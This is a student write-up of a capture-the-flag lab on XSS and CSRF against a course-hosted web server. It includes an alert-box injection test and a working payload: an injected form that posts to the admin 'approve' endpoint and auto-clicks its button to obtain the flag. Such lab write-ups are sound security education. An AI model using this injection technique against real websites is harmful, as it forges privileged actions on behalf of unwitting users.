# CTF 4 - XSS + CSRF

## 1. Reconnaissance

We were told that a web server would be available at http://ctf-fsi.fe.up.pt:5004. The following page was presented to us when we accessed the link.

![main_page](images/xss-csrf-ctf/main_page.png)

After inserting some text on the input field to check how the website handled such an event, we got the following result:

![result_page](images/xss-csrf-ctf/result_page.png)

A link to the admin page, present at http://ctf-fsi.fe.up.pt:5005, was available in the updated page; this where our request was supposed to be evaluated, so we decided to check it out.

![admin_page](images/xss-csrf-ctf/admin_page.png)

The buttons were disabled, so there was nothing we could do in that page for now.

## 2. Searching for/Choosing a Vulnerability

Firstly, we decided to check if there were any filters stopping us from injecting JavaScript in the input field.

```html
<script>alert("gonk")</script>
```

![js-alert](images/xss-csrf-ctf/alert.png)

This proved that there weren't any, so we would be able insert JavaScript code in our request.

By going back to the admin page and inspecting it further, we found a form related to the *Give the flag* button while looking at the page's elements.

```html
<form method="POST" action="/request/d5b78744f5a9bb495cf0e8d6bd2877189b176a6e/approve" role="form">
    <div class="submit">
        <input type="submit" id="giveflag" value="Give the flag" disabled=""> 
    </div>
</form>
```

We then decided to explore ways of exploiting this form by developing a script that would be able to simulate this behaviour. 

## 3. Finding an Exploit

We explored different scripts that would eventually allow us to access the flag, until we settled on this one:

```html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/<request_id>/approve" role="form">           
    <div class="submit">                     
        <input type="submit" id="giveflag" value="Give the flag">    
    </div>   
</form>      
<script type="text/javascript"> document.querySelector('#giveflag').click(); </script>
```

***Note:*** <request_id> needs to be replaced with the actual request's ID that is presented in the home page.

## 4. Exploring the Vulnerability

Our first attempt did not, however, succeed; we were redirected to a page that we did not have permission to access.

![error](images/xss-csrf-ctf/error.png)

After much trial and error, we came up with the idea of disabling JavaScript for this specific page on our browser, which theoretically would stop the redirecting process (although the admin could still do it).

![javascript](images/xss-csrf-ctf/javascript.png)

When we ran our script again, the page told us that our request was still being evaluated.

![evaluated](images/xss-csrf-ctf/evaluated.png)

However, after manually refreshing the page (which was not happening automatically anymore due to us disabling JavaScript), we were able to capture the flag.

![flag](images/xss-csrf-ctf/flag.png)